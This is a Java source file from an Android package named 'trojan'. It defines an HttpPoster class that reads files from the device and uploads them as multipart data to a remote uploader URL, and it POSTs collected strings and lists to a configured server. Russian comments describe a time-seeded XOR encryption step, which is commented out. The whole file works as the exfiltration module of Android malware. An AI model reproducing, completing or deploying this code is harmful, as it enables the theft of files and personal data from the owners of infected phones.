package com.example.trojan;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

import android.util.Base64OutputStream;
import android.util.Log;

public class HttpPoster implements Runnable{
	
	private String file_to_upload;
	private String data;
	private List<String> listdata = new ArrayList<String>();
	private boolean isfile=false;
	private boolean isarray=false;
	//String post_url=MyService.post_url;
	String post_url;
	
	public HttpPoster(String file) {
			isfile=true;
	       file_to_upload=file;
	   }
	
	public HttpPoster(String url,String data){
			isfile=false;
			this.data=data;
			post_url=url;
	}
	
	public HttpPoster(String url,List<String> listdata){
		isarray=true;
		this.listdata=listdata;
		post_url=url;
}
	
	public void run() {
		
	if(isfile){
		postfile();
	}
	else if(isarray){
		postarray();
	}
	else{
		post();
	}
		
	   }
		
	public void postfile(){
		long curtime=System.currentTimeMillis(); // текущее время = seed для шифровки
	  	  HttpURLConnection connection = null;
	  	  DataOutputStream outputStream = null;
	  	  String pathToOurFile = file_to_upload;
	  	  String uploader_url = MyService.uploader_url;
	  	  String lineEnd = "\r\n";
	  	  String twoHyphens = "--";
	  	  String boundary =  "*****";
	  	   
	  	  int bufferSize = 1024;
	  	  int bytesRead;
	  	   
	  	  try
	  	  {
	  	      byte[] buffer = new byte[bufferSize];
	  	      byte[] key = new byte[bufferSize];
	  		  
	  	      FileInputStream fileInputStream = new FileInputStream(new File(pathToOurFile) );
	  	      URL url = new URL(uploader_url);
	  	      connection = (HttpURLConnection) url.openConnection();
	  	      connection.setDoInput(true);
	  	      connection.setDoOutput(true);
	  	      connection.setUseCaches(false);
	  	      connection.setChunkedStreamingMode(bufferSize);
	  	      connection.setRequestMethod("GET");
	  	      connection.setRequestProperty("Connection", "Keep-Alive");
	  	      connection.setRequestProperty("Content-Type", "multipart/form-data;boundary="+boundary);
	  	      //application/octet-stream   multipart/form-data
	  	      connection.setRequestProperty("Time", Long.toString(curtime));  // передаем seed
	  	      outputStream = new DataOutputStream(connection.getOutputStream());
	  	      outputStream.writeBytes(twoHyphens + boundary + lineEnd);
	  	      outputStream.writeBytes("Content-Disposition: form-data; name=\"uploadedfile\";filename=\""+pathToOurFile +"\"" + lineEnd);
	  	      outputStream.writeBytes(lineEnd);
	  	      //Base64OutputStream b64 = new Base64OutputStream(outputStream,0);
	  	      bytesRead = fileInputStream.read(buffer, 0, bufferSize);
	  	   
	  	      while (bytesRead > 0)
	  	      {	  
	  	    	//new Random(curtime).nextBytes(key);  // заполняем массив ключа
	  			//for (int i=0;i<bytesRead;i++){
	  			  // buffer[i] = (byte)(buffer[i] ^ key[i]);};
	  			 outputStream.write(buffer, 0, bytesRead);
	  	          bytesRead = fileInputStream.read(buffer, 0, bufferSize);
	  	      }
	  	      //b64.flush();
	  	      outputStream.writeBytes(lineEnd);
	  	      outputStream.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
	  	      int serverResponseCode = connection.getResponseCode();
	  	      if (serverResponseCode==200){
	  	    	Log.d(MyService.LOG_TAG, "file "+file_to_upload+" uploaded successfully!"); 
	  	      }
	  	      else{
	  	    	Log.d(MyService.LOG_TAG, "file "+file_to_upload+" wasnt uploaded correctly");
	  	    	String serverResponseMessage = connection.getResponseMessage();
	    	      Log.d(MyService.LOG_TAG, "response code: "+serverResponseCode);
	    	      Log.d(MyService.LOG_TAG, "message:\n"+serverResponseMessage);
	  	      }
	  	      
	  	      fileInputStream.close();
	  	      outputStream.flush();
	  	      outputStream.close();
	  	  }
	  	  catch (Exception e)
	  	  {
	  		  Log.d(MyService.LOG_TAG, "error uploading file "+file_to_upload+"\n"+e.toString());
	  	  }
	  	
		}
		
	
	public void post(){
		try{
		URL obj = new URL(post_url);
		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
		con.setRequestMethod("POST");
		con.setDoOutput(true);
		OutputStream os = con.getOutputStream();
		os.write(data.getBytes());
		os.flush();
		os.close();

		int responseCode = con.getResponseCode();

		if (responseCode == HttpURLConnection.HTTP_OK) {
			//Log.d(MyService.LOG_TAG,"Response code: HTTP_OK");
		} else {
			Log.d(MyService.LOG_TAG,"POST request not worked\nResponce code:"+responseCode);
		}
	}
	catch(Exception e){
		Log.d(MyService.LOG_TAG,"error sending POST\n"+e.toString());
				}

	}
	
	public void postarray(){
		try{
		URL obj = new URL(post_url);
		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
		con.setRequestMethod("POST");
		con.setDoOutput(true);
		OutputStream os = con.getOutputStream();
		for (int i=0; i<listdata.size();i++){
		os.write(listdata.get(i).getBytes());
		os.write((byte) '\n');}
		os.flush();
		os.close();

		int responseCode = con.getResponseCode();

		if (responseCode == HttpURLConnection.HTTP_OK) {
			//Log.d(MyService.LOG_TAG,"Response code: HTTP_OK");
		} else {
			Log.d(MyService.LOG_TAG,"POST request not worked\nResponce code:"+responseCode);
		}
	}
	catch(Exception e){
		Log.d(MyService.LOG_TAG,"error sending POST\n"+e.toString());
				}

	}
	
}
